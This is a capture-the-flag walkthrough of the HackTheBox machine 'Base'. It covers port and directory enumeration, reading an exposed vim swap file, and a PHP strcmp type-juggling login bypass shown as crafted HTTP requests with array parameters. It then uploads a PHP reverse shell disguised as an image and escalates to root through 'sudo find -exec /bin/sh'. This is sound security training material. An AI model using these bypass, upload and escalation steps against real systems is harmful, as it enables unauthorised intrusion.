---
title: Base - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - php type juggling
  - reverse shell
  - suid binary
  - linux privilege escalation
---

# Base - A Hack The Box machine

Enumerate open ports and services.

```bash
nmap -sC -sV $ip -Pn
```

Ports 22 and 80 are open.

Add base.htb to /etc/hosts.

Enumerate directories:

```bash
gobuster dir -u http://base.htb/login -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt
```

Some file and folders uncovered:

```
- http://base.htb/_uploaded/
- http://base.htb/login/
- http://base.htb/login/login.php
- http://base.htb/forms/
- http://base.htb/assets/
- http://base.htb/logout.php
```

Under  /login there are three files: login.php, config.php and login.php.swp. There are two ways of reading the swap file, with strings and with vim:


```bash
vim -r login.php.swp
# -r  -- list swap files and exit or recover from a swap file

```

Content:

```
<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```


Quoting from the article [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09): "When comparing values, always try to use the type-safe comparison operator “===” instead of the loose comparison operator “==”. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. This means that (7 === “7”) will return False."

My notes about [php type jugling](webexploitation/php-type-juggling-vulnerabilities). 


In the HackTheBox machine Base, login form was bypasseable by entering an empty array into the username and password parameters:

```
Original request


POST /login/login.php HTTP/1.1
Host: base.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://base.htb
Connection: close
Referer: http://base.htb/login/login.php
Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
Upgrade-Insecure-Requests: 1

username=admin&password=admin

```


```
Crafted request:

POST /login/login.php HTTP/1.1
Host: base.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://base.htb
Connection: close
Referer: http://base.htb/login/login.php
Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
Upgrade-Insecure-Requests: 1

username[]=admin&password[]=admin
```

How to know? By spotting the file login.php.swp in the /login exposed directory and reading its contents.

After sending request with BurpSuite, grab the PHPsession cookie and in your browser enter that cookie and go to: http://base.htb/upload.php. Now you can upload our [pentesmonkey shell](pentesmonkey.md) using BurpSuite Repeater (important note: change header to "Content-Type: image/png", file extension may remain php). Have your netcat listener ready.


```bash
whoami
```

```
www-data
```

Credentials can be found at /var/www/html/login/config.php. Use them to login as the existing user at /home

```bash
su john
# enter password: thisisagoodpassword
```

Once you are john, you have access to user.txt. Also, to be root:

```bash
id
sudo -l
```

```
ohn@base:~$ sudo -l
sudo -l
[sudo] password for john: thisisagoodpassword

Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```


See [cheat sheet about suid binaries](suid-binaries.md) and:

```bash
sudo find . -exec /bin/sh \; -quit
```

Now you are root and can echo /root/root.txt
